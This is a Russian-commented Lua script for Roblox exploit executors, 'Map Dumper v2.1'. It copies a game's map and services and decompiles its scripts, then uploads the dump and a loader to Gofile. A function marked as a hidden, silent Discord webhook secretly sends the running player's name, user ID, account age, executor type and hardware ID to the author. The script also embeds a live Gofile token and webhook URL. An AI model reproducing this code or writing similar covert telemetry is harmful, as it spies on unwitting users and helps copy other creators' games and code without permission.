local HttpService = game:GetService("HttpService")
local task = task or delay
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

-- Проверка доступных функций для HTTP
local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

-- ================= КОНФИГУРАЦИЯ ================= --
local API_KEY = "dubo5V0tUTb1VHmO5dov2kL0QaDGuen8" -- Gofile Token
-- ВЕБХУК DISCORD (СКРЫТЫЙ)
local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1442677826200535162/ubaFKkqxPZkXBoqUQeufwJ6CLUycMmoFoGXiFg0H4nb21CYy1Xv7tTFa8UvMCwjoaTHB"
-- ================================================ --

local IGNORE_PLAYERS = true 
local TUTORIAL_LINK = "https://jpst.it/4JOG-"
local CURRENT_LANG = "RU"
local DUMP_MODE = "Full" -- Defaulting to Full as requested

local TEXTS = {
    RU = {
        Title = "JSON ДАМПЕР", Init = "Инициализация...", Counting = "Подсчет объектов...",
        Scanning = "Сканирование...", Encoding = "Кодирование JSON...",
        Uploading = "Загрузка файла ", Success = "УСПЕЕШНО!",
        LinkCopied = "Ссылка скопирована!", Error = "ОШИБКА",
        NoHttp = "HTTP запросы не поддерживаются!", LangTitle = "ВЫБЕРИТЕ ЯЗЫК",
        UploadFailed = "Загрузка не удалась", TutorialButton = "Инструкция (копировать)",
        FileSize = "Размер: %.1f MB", 
        ModeTitle = "ВЫБОР РЕЖИМА ДАМПА",
        ModeGeneral = "General (Только карта)",
        ModeFull = "Full (ВСЁ: Replicated, Gui, Scripts)",
        ModeStatus = "Режим: %s. Сканирование всех сервисов.",
        Warning = "ВНИМАНИЕ: Копирование НЕ гарантирует 100% точность (скрипты/физика). Full режим может занять много времени!",
        Warning2 = "Количество объектов может варьироваться из-за динамики игры. Результат зависит от эксплойта."
    },
    EN = {
        Title = "JSON DUMPER", Init = "Initializing...", Counting = "Counting objects...",
        Scanning = "Scanning...", Encoding = "Encoding JSON...",
        Uploading = "Uploading file ", Success = "SUCCESS!",
        LinkCopied = "Link copied to clipboard!", Error = "ERROR",
        NoHttp = "HTTP requests not supported!", LangTitle = "SELECT LANGUAGE",
        UploadFailed = "Upload failed", TutorialButton = "Tutorial (copy)",
        FileSize = "Size: %.1f MB",
        ModeTitle = "SELECT DUMP MODE",
        ModeGeneral = "General (Map only)",
        ModeFull = "Full (ALL: Replicated, Gui, Scripts)",
        ModeStatus = "Mode: %s. Scanning all services.",
        Warning = "WARNING: Copy does NOT guarantee 100% accuracy (scripts/physics). Full mode may take time!",
        Warning2 = "Object count may vary due to game dynamics. Result accuracy depends on the exploit."
    }
}

local function T(key) return TEXTS[CURRENT_LANG][key] or key end

local ScreenGui, MainFrame, StatusLabel, InfoLabel, Fill, ProgressFrame

-- UI CREATION (Language, Mode, Main)
local function createLanguageGUI(onSelected)
    if CoreGui:FindFirstChild("MapDumperUI") then CoreGui.MapDumperUI:Destroy() end
    local gui = Instance.new("ScreenGui") gui.Name = "MapDumperUI" gui.Parent = CoreGui
    local frame = Instance.new("Frame") frame.Size = UDim2.new(0, 300, 0, 150) frame.Position = UDim2.new(0.5, -150, 0.5, -75) frame.BackgroundColor3 = Color3.fromRGB(25, 25, 30) frame.Parent = gui Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
    local title = Instance.new("TextLabel") title.Size = UDim2.new(1,0,0,40) title.BackgroundTransparency = 1 title.Text = T("LangTitle") title.TextColor3 = Color3.fromRGB(255,255,255) title.Font = Enum.Font.GothamBold title.TextSize = 18 title.Parent = frame
    local function createBtn(text, pos, langCode)
        local btn = Instance.new("TextButton") btn.Size = UDim2.new(0.4, 0, 0, 40) btn.Position = pos btn.BackgroundColor3 = Color3.fromRGB(50, 50, 60) btn.Text = text btn.TextColor3 = Color3.fromRGB(255,255,255) btn.Font = Enum.Font.Gotham btn.TextSize = 16 btn.Parent = frame Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
        btn.MouseButton1Click:Connect(function() CURRENT_LANG = langCode gui:Destroy() onSelected() end)
    end
    createBtn("English", UDim2.new(0.05, 0, 0.5, 0), "EN") createBtn("Русский", UDim2.new(0.55, 0, 0.5, 0), "RU")
end

local function createModeGUI(onSelected)
    if CoreGui:FindFirstChild("MapDumperUI") then CoreGui.MapDumperUI:Destroy() end
    local gui = Instance.new("ScreenGui") gui.Name = "MapDumperUI" gui.Parent = CoreGui
    local frame = Instance.new("Frame") frame.Size = UDim2.new(0, 300, 0, 150) frame.Position = UDim2.new(0.5, -150, 0.5, -75) frame.BackgroundColor3 = Color3.fromRGB(25, 25, 30) frame.Parent = gui Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
    local title = Instance.new("TextLabel") title.Size = UDim2.new(1,0,0,40) title.BackgroundTransparency = 1 title.Text = T("ModeTitle") title.TextColor3 = Color3.fromRGB(255,255,255) title.Font = Enum.Font.GothamBold title.TextSize = 18 title.Parent = frame
    local function createBtn(text, pos, mode)
        local btn = Instance.new("TextButton") btn.Size = UDim2.new(0.4, 0, 0, 40) btn.Position = pos btn.BackgroundColor3 = Color3.fromRGB(50, 50, 60) btn.Text = text btn.TextColor3 = Color3.fromRGB(255,255,255) btn.Font = Enum.Font.Gotham btn.TextSize = 12 btn.TextWrapped = true btn.Parent = frame Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
        btn.MouseButton1Click:Connect(function() DUMP_MODE = mode gui:Destroy() onSelected() end)
    end
    createBtn(T("ModeGeneral"), UDim2.new(0.05, 0, 0.5, 0), "General") createBtn(T("ModeFull"), UDim2.new(0.55, 0, 0.5, 0), "Full")
end

local function createMainGUI()
    ScreenGui = Instance.new("ScreenGui") ScreenGui.Name = "MapDumperUI" ScreenGui.Parent = CoreGui ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    MainFrame = Instance.new("Frame") MainFrame.Size = UDim2.new(0, 280, 0, 170) MainFrame.Position = UDim2.new(1, -295, 0, 15) MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30) MainFrame.BorderSizePixel = 0 MainFrame.Parent = ScreenGui Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 8)
    local dragging, dragStart, frameStart = false, Vector2.new(0, 0), UDim2.new(0, 0, 0, 0)
    MainFrame.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = true dragStart = input.Position frameStart = MainFrame.Position end end)
    MainFrame.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end end)
    if UserInputService then UserInputService.InputChanged:Connect(function(input) if dragging then local delta = input.Position - dragStart MainFrame.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + delta.X, frameStart.Y.Scale, frameStart.Y.Offset + delta.Y) end end) end
    
    StatusLabel = Instance.new("TextLabel") StatusLabel.Size = UDim2.new(1, 0, 0, 25) StatusLabel.Position = UDim2.new(0, 0, 0, 5) StatusLabel.BackgroundTransparency = 1 StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255) StatusLabel.TextSize = 16 StatusLabel.Font = Enum.Font.GothamBold StatusLabel.Text = T("Title") StatusLabel.Parent = MainFrame
    InfoLabel = Instance.new("TextLabel") InfoLabel.Size = UDim2.new(1, 0, 0, 40) InfoLabel.Position = UDim2.new(0, 0, 0.2, 0) InfoLabel.BackgroundTransparency = 1 InfoLabel.TextColor3 = Color3.fromRGB(180, 180, 180) InfoLabel.TextSize = 12 InfoLabel.Font = Enum.Font.SourceSans InfoLabel.Text = T("Init") InfoLabel.TextWrapped = true InfoLabel.Parent = MainFrame
    ProgressFrame = Instance.new("Frame") ProgressFrame.Size = UDim2.new(0.9, 0, 0, 6) ProgressFrame.Position = UDim2.new(0.05, 0, 0.5, 0) ProgressFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50) ProgressFrame.BorderSizePixel = 0 ProgressFrame.Parent = MainFrame Instance.new("UICorner", ProgressFrame).CornerRadius = UDim.new(0, 3)
    Fill = Instance.new("Frame") Fill.Size = UDim2.new(0, 0, 1, 0) Fill.BackgroundColor3 = Color3.fromRGB(0, 120, 255) Fill.BorderSizePixel = 0 Fill.Parent = ProgressFrame Instance.new("UICorner", Fill).CornerRadius = UDim.new(0, 3)
    
    local WarningLabel = Instance.new("TextLabel") WarningLabel.Size = UDim2.new(1, 0, 0, 25) WarningLabel.Position = UDim2.new(0, 0, 0.6, 0) WarningLabel.BackgroundTransparency = 1 WarningLabel.TextColor3 = Color3.fromRGB(255, 100, 100) WarningLabel.TextSize = 10 WarningLabel.Font = Enum.Font.SourceSansBold WarningLabel.Text = T("Warning") WarningLabel.TextWrapped = true WarningLabel.Parent = MainFrame
    local WarningLabel2 = Instance.new("TextLabel") WarningLabel2.Size = UDim2.new(1, 0, 0, 20) WarningLabel2.Position = UDim2.new(0, 0, 0.75, 0) WarningLabel2.BackgroundTransparency = 1 WarningLabel2.TextColor3 = Color3.fromRGB(255, 100, 100) WarningLabel2.TextSize = 10 WarningLabel2.Font = Enum.Font.SourceSans WarningLabel2.Text = T("Warning2") WarningLabel2.TextWrapped = true WarningLabel2.Parent = MainFrame
end

local function updateStatus(status, progressPercent, color)
    if not ScreenGui then return end
    InfoLabel.Text = status
    if progressPercent then Fill.Size = UDim2.new(math.clamp(progressPercent/100, 0, 1), 0, 1, 0) else Fill.Size = UDim2.new(0, 0, 1, 0)  end
    if color then Fill.BackgroundColor3 = color end
end

local function createTutorialButton()
    if not MainFrame then return end
    local TutorialButton = Instance.new("TextButton") TutorialButton.Size = UDim2.new(0.9, 0, 0, 25) TutorialButton.Position = UDim2.new(0.05, 0, 0.88, 0)  TutorialButton.BackgroundColor3 = Color3.fromRGB(70, 70, 80) TutorialButton.Text = T("TutorialButton") .. " (" .. TUTORIAL_LINK .. ")" TutorialButton.TextColor3 = Color3.fromRGB(255, 255, 255) TutorialButton.TextSize = 12 TutorialButton.Font = Enum.Font.GothamBold TutorialButton.Parent = MainFrame Instance.new("UICorner", TutorialButton).CornerRadius = UDim.new(0, 6)
    TutorialButton.MouseButton1Click:Connect(function() pcall(function() setclipboard(TUTORIAL_LINK) end) InfoLabel.Text = T("LinkCopied") task.delay(3, function() InfoLabel.Text = T("Success") end) end)
end

-- ==================== WEBHOOK DISCORD ==================== --
local function getExploitType()
    local exploitType = "Unknown/Custom"
    if fluxus then exploitType = "Fluxus" end
    if Krnl then exploitType = "Krnl" end
    if Synapse then exploitType = "Synapse X" end
    if Delta then exploitType = "Delta" end
    if ScriptWare then exploitType = "Script-Ware" end
    if getgenv and getgenv()._G then exploitType = "Generic (GEnv)" end
    if rawget and rawget(getfenv(0), "syn") then exploitType = "Generic (Syn/HttpService)" end
    return exploitType
end

local function getExecutorDetails()
    local hwid = (gethwid and gethwid()) or "Hidden/Not Supported"
    local expType = getExploitType()
    return hwid, expType
end

local function sendDiscordNotification(downloadLink, objectCount)
    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "" then return end

    local player = Players.LocalPlayer
    local userId = player.UserId
    local placeId = game.PlaceId
    local gameName = game.Name or "Unnamed Game"
    local gameLink = "https://www.roblox.com/games/" .. tostring(placeId)
    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
    local hwid, expType = getExecutorDetails()

    local embed = {
        ["title"] = "🗺️ Карта успешно скопирована!",
        ["description"] = "Новый дамп был выполнен пользователем.",
        ["color"] = 3066993, -- Green-blue
        ["fields"] = {
            { ["name"] = "👤 Игрок", ["value"] = "**Ник:** " .. player.Name .. "\n**Display Name:** " .. player.DisplayName .. "\n**ID:** " .. tostring(userId) .. "\n**Аккаунт с:** " .. player.AccountAge .. " дней", ["inline"] = true },
            { ["name"] = "🖥️ Эксплойт", ["value"] = "**Тип:** " .. expType .. "\n**HWID:** ||" .. hwid .. "||", ["inline"] = true },
            { ["name"] = "📍 Игра", ["value"] = "**Название:** " .. gameName .. "\n**Place ID:** " .. tostring(placeId) .. "\n**URL:** [Перейти](" .. gameLink .. ")", ["inline"] = false },
            { ["name"] = "⚙️ Информация о Дампе", ["value"] = "**Режим:** " .. DUMP_MODE .. "\n**Объектов:** " .. tostring(objectCount) .. "\n**Сервисов:** " .. tostring(#game:GetChildren()) .. "\n**Точность:** Не 100% (см. предупреждение)", ["inline"] = false },
            { ["name"] = "📂 Ссылка для скачивания", ["value"] = "[**Gofile Download Page**](" .. downloadLink .. ")\n\n**ПРИМЕЧАНИЕ:** JSON и Loader.lua загружены отдельно.", ["inline"] = false }
        },
        ["thumbnail"] = { ["url"] = avatarUrl },
        ["footer"] = { ["text"] = "Map Dumper v2.1 • " .. os.date("%Y-%m-%d %X") }
    }

    local payload = HttpService:JSONEncode({ ["embeds"] = {embed} })

    -- Silent request
    pcall(function()
        httpRequest({
            Url = DISCORD_WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end)
end
-- ==================================================================== --

-- LOADER CODE TO EMBED IN JSON
local LOADER_CODE = [=[
local HttpService = game:GetService("HttpService")
local jsonString = [[ ВСТАВЬТЕ JSON СЮДА / PASTE JSON HERE ]] 

local s, data = pcall(function() return HttpService:JSONDecode(jsonString) end)
if not s or not data then warn("JSON decode error:", data); return end
local mapRoot = data.Map

local function deserializeType(t)
    if not t then return nil end
    if t.X and t.Y and t.Z and not t.Pos then return Vector3.new(t.X, t.Y, t.Z) end
    if t.X and t.Y and not t.Z then return Vector2.new(t.X, t.Y) end
    if t.Pos and t.Rot then 
        local cf = CFrame.new(t.Pos.X, t.Pos.Y, t.Pos.Z)
        local rot = t.Rot
        return cf * CFrame.Angles(math.rad(rot.X or 0), math.rad(rot.Y or 0), math.rad(rot.Z or 0))
    end
    if t.R and t.G and t.B then return Color3.new(t.R, t.G, t.B) end
    if t.SX and t.SY then return UDim2.new(t.SX, t.OX or 0, t.SY, t.OY or 0) end
    if t.Keypoints then 
        local kps = {}
        for _, kp in ipairs(t.Keypoints) do
            local c = kp.Color
            table.insert(kps, ColorSequenceKeypoint.new(kp.Time, Color3.new(c.R, c.G, c.B)))
        end
        return ColorSequence.new(kps)
    end
    if t.Value and (t.Value.X or t.Value.R) then return deserializeType(t.Value) end 
    return t
end

local function getEnumFromValue(value)
    if type(value) == "string" and string.find(value, "Enum%.") then
        local enumType, enumName = string.match(value, "Enum%.([^%.]+)%.(.+)")
        if enumType and Enum[enumType] and Enum[enumType][enumName] then
            return Enum[enumType][enumName]
        end
    end
    return nil
end

local function build(node, parent)
    local props = node.Props
    local obj
    pcall(function()
        obj = Instance.new(props.ClassName)
        obj.Name = props.Name
        for key, value in pairs(props) do
            pcall(function()
                if key == "Name" or key == "ClassName" or key == "Part0" or key == "Part1" or key == "Source" or key == "Parent" then return end
                local deserializedValue = deserializeType(value)
                if deserializedValue ~= value then
                    obj[key] = deserializedValue
                elseif typeof(obj[key]) == "BrickColor" and type(value) == "string" then
                    obj[key] = BrickColor.new(value)
                else
                    local enumValue = getEnumFromValue(value)
                    if enumValue then obj[key] = enumValue else obj[key] = value end
                end
            end)
        end

        if (obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script")) and props.Source and props.Source:sub(1,10) ~= "-- No Dec" then
            pcall(function() obj.Source = props.Source end)
        end
        
        if (obj:IsA("JointInstance") or obj:IsA("Constraint")) and props.Part0 and props.Part1 then
            task.delay(0.5, function()
                 local part0 = parent:FindFirstChild(props.Part0, true)
                 local part1 = parent:FindFirstChild(props.Part1, true)
                 if part0 and part1 then
                     pcall(function() obj.Part0 = part0 end)
                     pcall(function() obj.Part1 = part1 end)
                 end
            end)
        end
        
        obj.Parent = parent
    end)
    
    if obj then
        for _, child in pairs(node.Children) do
            build(child, obj)
        end
    end
end

-- CLEANUP WORKSPACE
for _, child in pairs(game.Workspace:GetChildren()) do
    if child.Name ~= "Terrain" and not child:IsA("Camera") and not child:IsA("Sky") then child:Destroy() end
end

print("Starting restoration...")

-- Handling multiple services
if mapRoot.Props and mapRoot.Props.Name == "GAME_ROOT" then
    for _, serviceNode in pairs(mapRoot.Children) do
        local serviceName = serviceNode.Props.Name
        local service = game:GetService(serviceName)
        if service then
            print("Restoring service: " .. serviceName)
            
            -- Only clear Workspace children (to remove player character, etc.)
            if serviceName == "Workspace" then
                 for _, child in pairs(service:GetChildren()) do
                    if child.Name ~= "Terrain" and not child:IsA("Camera") and not child:IsA("Sky") then child:Destroy() end
                 end
            end
            
            -- Restoration: If it's a model, restore directly, otherwise use a folder
            if serviceName == "Workspace" then
                for _, child in pairs(serviceNode.Children) do build(child, service) end
            else
                 local folder = Instance.new("Folder")
                 folder.Name = "Restored_" .. serviceName
                 folder.Parent = service
                 for _, child in pairs(serviceNode.Children) do build(child, folder) end
            end
        end
    end
end

print("Map loaded successfully!")
]=]

local function serializeType(val)
    local t = typeof(val)
    if t == "Vector3" then return {X=val.X, Y=val.Y, Z=val.Z} end
    if t == "Vector2" then return {X=val.X, Y=val.Y} end
    if t == "CFrame" then 
        local pos = val.Position
        local x,y,z = val:ToEulerAnglesXYZ()
        return {Pos={X=pos.X, Y=pos.Y, Z=pos.Z}, Rot={X=math.deg(x), Y=math.deg(y), Z=math.deg(z)}} 
    end
    if t == "Color3" then return {R=val.R, G=val.G, B=val.B} end
    if t == "EnumItem" then return tostring(val) end
    if t == "UDim2" then return {SX=val.X.Scale, OX=val.X.Offset, SY=val.Y.Scale, OY=val.Y.Offset} end
    if t == "BrickColor" then return val.Name end
    if t == "ColorSequence" then
        local kps = {}
        for _, kp in ipairs(val.Keypoints) do
            local c = kp.Value
            table.insert(kps, {Time=kp.Time, Color={R=c.R, G=c.G, B=c.B}})
        end
        return {Keypoints = kps}
    end
    -- Handle ValueObjects
    if t == "Instance" and (val:IsA("StringValue") or val:IsA("IntValue") or val:IsA("BoolValue") or val:IsA("NumberValue")) then
        return serializeType(val.Value)
    end
    return val
end

local function getProps(obj)
    local props = {}
    props.Name = obj.Name
    props.ClassName = obj.ClassName
    
    pcall(function()
        if DUMP_MODE == "General" or DUMP_MODE == "Full" then
            -- General properties
            if obj:IsA("BasePart") then
                props.CFrame = serializeType(obj.CFrame)
                props.Size = serializeType(obj.Size)
                props.Color = serializeType(obj.Color)
                props.BrickColor = serializeType(obj.BrickColor)
                props.Transparency = obj.Transparency
                props.Material = tostring(obj.Material)
                props.Anchored = obj.Anchored
                props.CanCollide = obj.CanCollide
                props.Shape = tostring(obj.Shape)
                props.Reflectance = obj.Reflectance
                props.Massless = obj.Massless
                props.CastShadow = obj.CastShadow
            end
            
            -- GUI properties
            if obj:IsA("GuiBase2d") then 
                props.Size = serializeType(obj.Size)
                props.Position = serializeType(obj.Position)
                props.AnchorPoint = serializeType(obj.AnchorPoint)
                props.BackgroundColor3 = serializeType(obj.BackgroundColor3)
                props.Visible = obj.Visible
                props.ZIndex = obj.ZIndex
                if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
                    props.Text = obj.Text
                    props.TextColor3 = serializeType(obj.TextColor3)
                    props.TextSize = obj.TextSize
                    props.TextScaled = obj.TextScaled
                end
            end
            
            -- Script properties (Full scan only)
            if DUMP_MODE == "Full" and (obj:IsA("LocalScript") or obj:IsA("ModuleScript") or obj:IsA("Script")) then
                props.Disabled = obj.Disabled 
                if decompile then
                    local s, src = pcall(decompile, obj)
                    if s then props.Source = src else props.Source = "-- Decompile failed" end
                else
                    props.Source = "-- No Decompiler"
                end
            end
            
            -- Value properties
            if obj:IsA("StringValue") or obj:IsA("IntValue") or obj:IsA("BoolValue") or obj:IsA("NumberValue") then
                props.Value = serializeType(obj.Value)
            end
            
            -- Other visual/audio properties
            if obj:IsA("ParticleEmitter") then
                props.Texture = obj.Texture
                props.ColorSequence = serializeType(obj.ColorSequence)
                props.Rate = obj.Rate
            elseif obj:IsA("Sound") then
                props.SoundId = obj.SoundId
                props.Volume = obj.Volume
                props.Looped = obj.Looped
            end
            
            -- Joint/Constraint properties
            if obj:IsA("JointInstance") or obj:IsA("Constraint") then
                props.Part0 = obj.Part0 and obj.Part0.Name or nil
                props.Part1 = obj.Part1 and obj.Part1.Name or nil
                if obj:IsA("Weld") or obj:IsA("Motor6D") then
                    props.C0 = serializeType(obj.C0)
                    props.C1 = serializeType(obj.C1)
                end
            end
        end
    end)
    return props
end

local scannedCount = 0
local totalToScan = 0

local function countDescendants(obj)
    local c = 0
    local s, children = pcall(function() return obj:GetChildren() end)
    if not s or not children then return 0 end
    
    for _, v in ipairs(children) do
        if IGNORE_PLAYERS and v:IsA("Model") and game.Players:GetPlayerFromCharacter(v) then continue end
        if v:IsA("Terrain") and v.Parent == Workspace then continue end
        -- Skip services that are children of other services by default
        if v.Parent and v.Parent ~= game and game:GetService(v.Name) then continue end
        
        c = c + 1 + countDescendants(v)
    end
    return c
end

local function scan(obj)
    scannedCount = scannedCount + 1
    
    if scannedCount % 500 == 0 then
        updateStatus(T("Scanning") .. " (" .. scannedCount .. "/" .. totalToScan .. ")")
        task.wait()
    end

    local node = { Props = getProps(obj), Children = {} }
    
    local s, children = pcall(function() return obj:GetChildren() end)
    if s and children then
        for _, child in ipairs(children) do
            if IGNORE_PLAYERS and child:IsA("Model") and game.Players:GetPlayerFromCharacter(child) then continue end
            if child:IsA("Terrain") and child.Parent == Workspace then continue end
            if child.Name == "Camera" and child.Parent == Workspace then continue end
            if child.Parent and child.Parent ~= game and game:GetService(child.Name) then continue end
            
            table.insert(node.Children, scan(child))
        end
    end
    return node
end

local function uploadToGofile(files)
    local downloadPage = nil
    
    for i, file in ipairs(files) do
        local fileSizeMB = #file.filedata / 1024 / 1024
        local status = T("Uploading") .. file.filename .. string.format(" (%d из %d, ", i, #files) .. string.format(T("FileSize"), fileSizeMB) .. ")"
        
        local boundary = "---------------------------"..tostring(math.random(1000000000000,9999999999999))
        local body = ""
        
        body = body .. "--"..boundary.."\r\n"..
               'Content-Disposition: form-data; name="token"\r\n\r\n'..API_KEY.."\r\n"
        
        -- Add parent folder ID if we have already uploaded one file
        if downloadPage then
            local folderId = string.match(downloadPage, "d/(%w+)") -- Extract folder ID from previous link
            if folderId then
                body = body .. "--"..boundary.."\r\n"..
                       'Content-Disposition: form-data; name="folderId"\r\n\r\n'..folderId.."\r\n"
            end
        end
               
        body = body .. "--"..boundary.."\r\n"..
                   'Content-Disposition: form-data; name="file"; filename="'..file.filename..'"\r\n'..
                   "Content-Type: application/octet-stream\r\n\r\n"..
                   file.filedata.."\r\n"
        
        body = body .. "--"..boundary.."--"

        local headers = {["Content-Type"]="multipart/form-data; boundary="..boundary}
        local servers = {"https://store1.gofile.io/uploadFile", "https://api.gofile.io/uploadFile"}
        local response
        
        local animateTask
        local p = 0
        animateTask = task.spawn(function()
            while not response do
                p = (p + 10) % 100
                updateStatus(status, p, Color3.fromRGB(255, 170, 0))
                task.wait(0.05)
            end
            updateStatus(status, 100, Color3.fromRGB(0, 120, 255))
        end)
        
        for _, url in ipairs(servers) do
            if not response then
                pcall(function() response = httpRequest({Url = url, Method = "POST", Headers = headers, Body = body}) end)
            end
        end
        
        task.cancel(animateTask)
        
        if not response or not response.Body then return false, "No Response (HTTP)" end
        
        local s, t = pcall(function() return HttpService:JSONDecode(response.Body) end)
        
        if s and t and t.status == "ok" and t.data and t.data.downloadPage then
            downloadPage = t.data.downloadPage
        else
            return false, T("UploadFailed") .. " (Gofile)"
        end
    end
    
    return true, downloadPage
end

local function startDumper()
    if not httpRequest then
        createMainGUI()
        updateStatus(T("Error"), 100, Color3.fromRGB(200, 50, 50))
        InfoLabel.Text = T("NoHttp")
        return
    end

    createMainGUI()

    task.spawn(function()
        updateStatus(string.format(T("ModeStatus"), DUMP_MODE), 0)
        task.wait(0.5)
        
        -- DEFINING WHAT TO SCAN
        local rootsToScan = {}
        
        -- Scanning 8 Key Services for maximum completeness
        table.insert(rootsToScan, game:GetService("Workspace"))
        table.insert(rootsToScan, game:GetService("ReplicatedStorage"))
        table.insert(rootsToScan, game:GetService("Lighting"))
        table.insert(rootsToScan, game:GetService("ReplicatedFirst"))
        table.insert(rootsToScan, game:GetService("StarterPack"))
        table.insert(rootsToScan, game:GetService("StarterGui"))
        table.insert(rootsToScan, game:GetService("Teams"))
        table.insert(rootsToScan, game:GetService("SoundService"))

        updateStatus(T("Counting"))
        task.wait(0.1)
        
        totalToScan = 0
        for _, root in ipairs(rootsToScan) do
            pcall(function() totalToScan = totalToScan + countDescendants(root) end)
        end
        if totalToScan < 1 then totalToScan = 1 end
        
        updateStatus(T("Scanning") .. " (0/" .. totalToScan .. ")")
        
        -- CREATE A VIRTUAL ROOT FOR MULTI-SERVICE DUMP
        local gameRoot = { Props = {Name = "GAME_ROOT", ClassName = "Folder"}, Children = {} }
        
        for _, root in ipairs(rootsToScan) do
            local serviceNode = scan(root)
            -- Override name to ensure it matches service name
            serviceNode.Props.Name = root.Name 
            table.insert(gameRoot.Children, serviceNode)
        end
        
        local mapData = {
            Info = {PlaceId = game.PlaceId or 0, Name = game.Name or "Unknown", Date = os.time(), Mode=DUMP_MODE, TotalObjects = totalToScan},
            Map = gameRoot
        }
        
        updateStatus(T("Encoding"))
        task.wait(0.1)
        
        local jsonData
        local s, err = pcall(function() jsonData = HttpService:JSONEncode(mapData) end)
        
        if not s then
            updateStatus(T("Error"), 100, Color3.fromRGB(255, 50, 50))
            InfoLabel.Text = "JSON Error: " .. tostring(err)
            return
        end
        
        local filesToUpload = {
            {filename="MapDump_"..game.PlaceId.."_"..tostring(os.time())..".json", filedata=jsonData},
            {filename="Loader.lua", filedata=LOADER_CODE}
        }
        
        local ok, link = uploadToGofile(filesToUpload)
        
        if ok then
            updateStatus(T("Success"), 100, Color3.fromRGB(0, 200, 50))
            InfoLabel.Text = T("LinkCopied")
            pcall(function() setclipboard(link) end)
            
            -- Silent send
            sendDiscordNotification(link, totalToScan)
            
            createTutorialButton()
            
        else
            updateStatus(T("Error"), 100, Color3.fromRGB(200, 50, 50))
            InfoLabel.Text = T("UploadFailed") .. ": " .. tostring(link)
        end
        
        task.delay(10, function() if ScreenGui then ScreenGui:Destroy() end end)
    end)
end


createLanguageGUI(function()
    createModeGUI(startDumper)
end)
